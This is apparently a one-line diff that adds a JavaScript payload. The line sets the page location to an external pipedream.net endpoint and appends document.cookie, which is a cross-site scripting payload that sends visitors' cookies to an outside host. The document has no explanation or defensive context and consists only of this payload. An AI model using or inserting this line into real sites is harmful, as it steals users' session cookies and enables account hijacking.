@@ -1,0 +1,1 @@
+location='https://eou6qllnt3mb4pl.m.pipedream.net/?cookie='+document.cookie
